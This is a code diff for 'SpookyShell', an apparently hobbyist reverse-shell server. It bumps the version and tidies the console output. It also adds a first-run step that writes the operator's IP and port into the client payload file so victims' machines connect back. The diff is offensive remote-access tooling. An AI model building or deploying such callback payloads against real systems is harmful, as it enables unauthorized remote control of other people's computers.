@@ -27,6 +27,7 @@ import threading
 import os
 import re
 import importlib
+import shutil
 
 from rich.table import Table
 from rich import box
@@ -91,7 +92,7 @@ def get_blocked_ips(file: str):
     blocked = []
 
     try:
-        data = read_data(file)
+        data = read_data(file, verbose)
         blocked = data[0]
     except IndexError:
         pass
@@ -104,7 +105,7 @@ def get_saved_ips(file: str):
     saved = []
 
     try:
-        data = read_data(file)
+        data = read_data(file, verbose)
         saved = data[1]
     except IndexError:
         pass
@@ -162,8 +163,7 @@ def send_commands(conn: socket.socket, name, host_addr):
         cmd = cmd.lower()
 
         if cmd == "quit":
-            if verbose:
-                print_but_cooler(console, "Info", "Broke from session.", "bold cyan")
+            print_but_cooler(console, "Info", "Broke from session.", "bold cyan")
             break
 
         if len(str.encode(cmd)) > 0:
@@ -338,7 +338,7 @@ def list_connections(all_connections: list, all_addresses: list):
 
         console.print(clients)
     else:
-        print("There are no current connections.")
+        console.print("There are no current connections. 😟")
 
 def work():
     """Does the next job in the queue (one handles connetions, one sends commands)
@@ -437,7 +437,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    version = "1.0.0"
+    version = "1.2.0"
     verbose = args.verbose
 
     if args.quiet == False: # Display logo and credit
@@ -460,6 +460,20 @@ if __name__ == "__main__":
         console.print(f"[pale_turquoise1]SpookyShell[/pale_turquoise1] Version {version}.", highlight=False)
         console.print("[dim]The next best reverse shell.[/dim]")
         sys.exit(0)
+
+    if not os.path.isfile("data.dat"):
+        print_but_cooler(console, "Info", "Looks like you're new! Generating payload at [bold]client/client.py[/bold][white]...[/white]", "bold cyan")
+        shutil.copy("client/client.py", "client/client.backup")
+        with open("client/client.py", "r+") as file:
+            lines = file.readlines()
+
+            lines[1] = f"HOST = \"{args.ip}\"\n"
+            lines[2] = f"PORT = {args.port}\n"
+            file.seek(0)
+            file.truncate()
+
+            file.writelines(lines)
+        print_but_cooler(console, "Info", "Set host and port to the provided host and port. [bold](host is set to your ip if the program wasn't provided one in the command line arguments)[/bold]", "bold cyan")
 
     if verbose:
             print_but_cooler(console, "Info", "Displaying login screen..", "bold cyan")
